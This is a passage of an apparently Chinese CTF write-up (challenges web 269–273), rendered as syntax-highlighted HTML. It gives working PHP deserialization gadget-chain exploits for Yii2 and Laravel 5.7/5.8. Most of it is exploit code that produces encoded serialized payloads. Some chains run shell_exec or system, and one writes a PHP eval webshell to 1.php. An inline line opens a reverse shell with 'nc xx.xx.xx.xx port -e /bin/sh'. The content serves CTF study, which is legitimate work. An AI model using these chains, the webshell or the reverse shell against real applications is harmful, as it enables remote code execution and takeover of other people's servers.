  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>CreateAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token comment\">// 这里需要改为 isRunning</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'render'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CreateAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">phpDocumentor<span class=\"token punctuation\">\\</span>Reflection<span class=\"token punctuation\">\\</span>DocBlock<span class=\"token punctuation\">\\</span>Tags</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">See</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$description</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">description</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">namespace</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">phpDocumentor<span class=\"token punctuation\">\\</span>Reflection<span class=\"token punctuation\">\\</span>DocBlock<span class=\"token punctuation\">\\</span>Tags<span class=\"token punctuation\">\\</span>See</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Swift_KeyCache_DiskKeyCache</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$keys</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$path</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">path</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">See</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">keys</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token string double-quoted-string\">\"axin\"</span><span class=\"token operator\">=></span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"is\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"handsome\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">// 生成 poc</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Swift_KeyCache_DiskKeyCache</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"web-270\"><a class=\"anchor\" href=\"#web-270\">#</a> web 270</h1>\n<p>也可以反弹 shell</p>\n<p><code>$exp = new \\yii\\db\\BatchQueryResult('shell_exec', &quot;nc xx.xx.xx.xx port -e /bin/sh&quot;);</code></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Action</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexAction</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>web</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MultiFieldSession</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$writeCallback</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">DbSession</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">MultiFieldSession</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">writeCallback</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>IndexAction</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"run\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>base<span class=\"token punctuation\">\\</span>BaseObject</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>web<span class=\"token punctuation\">\\</span>DbSession</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$exp</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell_exec'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"echo '&lt;?php eval(\\$_POST[1]); ?>' > 1.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$exp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><h1 id=\"web-271\"><a class=\"anchor\" href=\"#web-271\">#</a> web 271</h1>\n<p>laravel5.7 反序列化漏洞</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Testing</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">PendingCommand</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$app</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$parameters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$app</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$parameters</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span>                 <span class=\"token comment\">// 一个实例化的类 Illuminate\\Auth\\GenericUser</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">app</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$app</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 一个实例化的类 Illuminate\\Foundation\\Application</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">command</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 要执行的 php 函数 system</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">parameters</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$parameters</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 要执行的 php 函数的参数  array ('id')</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">DefaultGenerator</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$default</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$default</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">default</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$default</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Foundation</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Application</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$instances</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$instances</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">instances</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Illuminate\\Contracts\\Console\\Kernel'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$instances</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$defaultgenerator</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Faker<span class=\"token punctuation\">\\</span>DefaultGenerator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hello\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token variable\">$app</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Application</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token variable\">$application</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Application</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$app</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token variable\">$pendingcommand</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Testing<span class=\"token punctuation\">\\</span>PendingCommand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$defaultgenerator</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$application</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pendingcommand</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><h1 id=\"web-272-273\"><a class=\"anchor\" href=\"#web-272-273\">#</a> web 272、273</h1>\n<p>laravel5.8 反序列化漏洞</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Author:monitor</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>description:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    laravel deserialization chain</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Broadcasting</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">PendingBroadcast</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$events</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$event</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$events</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$event</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">events</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$events</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">event</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$event</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Bus</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Dispatcher</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span 